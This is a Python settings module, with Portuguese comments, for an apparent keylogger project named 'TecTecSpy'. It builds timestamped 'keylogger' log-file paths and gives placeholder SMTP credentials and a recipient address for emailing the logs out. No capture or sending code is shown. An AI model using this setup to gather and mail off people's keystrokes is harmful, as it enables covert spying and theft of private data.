"""
Este módulo contém as configurações do projeto TecTecSpy.

Ele define o caminho do arquivo de log e as configurações de e-mail
necessárias para o envio de logs.
"""

import os
from datetime import datetime

# Diretório de logs
project_root = os.path.dirname(os.path.abspath(__file__))
log_directory = os.path.join(project_root, 'logs')

# Função para gerar o caminho do log com base na data e hora atuais
def get_log_file_path():
    # Diretório de logs na raiz do projeto
    project_root = os.path.dirname(os.path.abspath(__file__))
    log_directory = os.path.join(project_root, '..', 'logs')  # Caminho correto para a raiz

    # Cria o nome do arquivo de log com base na data e hora atuais
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return os.path.join(log_directory, f'keylogger_{current_time}.log')

# Configurações de email
SMTP_SERVER = "smtp.example.com"
SMTP_PORT = 587
SMTP_USERNAME = "your_email@example.com"
SMTP_PASSWORD = "your_password"
RECIPIENT_EMAIL = "recipient@example.com"

